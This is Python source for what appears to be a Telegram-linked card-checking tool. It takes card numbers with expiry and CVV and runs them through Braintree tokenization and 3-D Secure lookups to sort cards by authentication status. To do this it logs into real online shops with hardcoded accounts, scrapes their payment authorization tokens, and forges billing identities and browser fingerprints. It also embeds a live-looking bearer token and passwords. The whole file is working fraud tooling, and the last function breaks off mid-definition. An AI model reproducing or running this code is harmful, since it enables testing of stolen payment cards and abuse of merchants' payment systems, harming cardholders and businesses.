import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time

acc = None  # تعريف متغير global لتخزين قيمة acc

def generate_random_account():
	global acc  # تعيين acc كـ global داخل الدالة
	name = ''.join(random.choices(string.ascii_lowercase, k=20))
	number = ''.join(random.choices(string.digits, k=4))
	acc = f"{name}{number}@gmail.com"  # تعيين قيمة لـ acc
	return acc

def generate_emails_periodically():
	while True:
		generate_random_account()
	  #  print(acc)
		time.sleep(0.1)

# إنشاء موضوع لتشغيل الدالة
thread = threading.Thread(target=generate_emails_periodically)
thread.start()

# الآن يمكنك الوصول إلى قيمة acc من هنا




	

		
		
		
		
		
		












def otps(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())
	r=requests.session()

	
	

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE0NjI2OTQsImp0aSI6Ijk1ZTdlNjkwLWVkYmMtNDA3ZS04ZDVkLWZlOTdiZmM4YzlmYyIsInN1YiI6IjhkNWhoNDhxcTVxMnA3NnAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkNWhoNDhxcTVxMnA3NnAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkxFQ0hBTUVBVS1HQlAtVUsifX0.3rRjsmagV2Y50vH3Qv444I6603xg5a3nLULQK4ESGlpD4Uz6ePv9ql0N9Pee74K0Xn79bnWJrt_QGwv2lHLFWw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'abd3b4a4-3336-42de-a333-57643d3e112c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)








	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)

	import requests

	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.lechameau.com',
    'referer': 'https://www.lechameau.com/checkout',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'amount': '220',
    'additionalInfo': {
        'acsWindowSize': '03',
    },
    'bin': '516361',
    'dfReferenceId': '0_1742ca94-2c4c-4ca3-a3ae-2f4528ad0ec3',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.92.2',
        'cardinalDeviceDataCollectionTimeElapsed': 1296,
        'issuerDeviceDataCollectionTimeElapsed': 6515,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE0NjI3MzEsImp0aSI6IjBjMzFhZDAxLTFjNjUtNDJlMS04MTc2LWQ5OTBkOWY3MjA2ZSIsInN1YiI6IjhkNWhoNDhxcTVxMnA3NnAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkNWhoNDhxcTVxMnA3NnAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkxFQ0hBTUVBVS1HQlAtVUsifX0.mnumjFRMhglwLCPwSRFMJdnkYlHy4pKnnYdGsF0nklYPbMDAtjCbf6iTMfOJoegVR_JYqbHf7uwEmXSwgFyRwQ',
    'braintreeLibraryVersion': 'braintree/web/3.92.2',
    '_meta': {
        'merchantAppId': 'www.lechameau.com',
        'platform': 'web',
        'sdkVersion': '3.92.2',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '9abfc5cf-80d8-46fe-9102-73d7b3d006cf',
    },
}

	response = requests.post(
    f'https://api.braintreegateway.com/merchants/8d5hh48qq5q2p76p/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv
	













def otps2(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=scraper.get("https://beardedcolonel.co.uk/my-account/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)
	

	headers = {
		'user-agent': user,
	}
	data = {
	'username': 'bmwiraqy9074@gmail.com',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://beardedcolonel.co.uk/my-account/', headers=headers, data=data)


	r = scraper.get('https://beardedcolonel.co.uk/my-account/add-payment-method/', headers=headers)

	aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4 = str(base64.b64decode(aut))
	auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
	f'https://api.braintreegateway.com/merchants/d96qc5y2r25zrtht/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv







def otps3(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=scraper.get("https://www.luminati.co.uk/my-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)
	

	headers = {
		'user-agent': user,
	}
	data = {
	'username': 'sxdxxrpp@hi2.in',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers, data=data)


	r = scraper.get('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers)

	aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4 = str(base64.b64decode(aut))
	auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
	f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv





def otps33(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=scraper.get("https://beardedcolonel.co.uk/my-account/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)
	

	headers = {
		'user-agent': user,
	}
	data = {
	'username': 'bmwiraqy9074@gmail.com',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://beardedcolonel.co.uk/my-account/', headers=headers, data=data)


	r = scraper.get('https://beardedcolonel.co.uk/my-account/add-payment-method/', headers=headers)

	aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4 = str(base64.b64decode(aut))
	auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
	f'https://api.braintreegateway.com/merchants/d96qc5y2r25zrtht/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv















def otps4(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
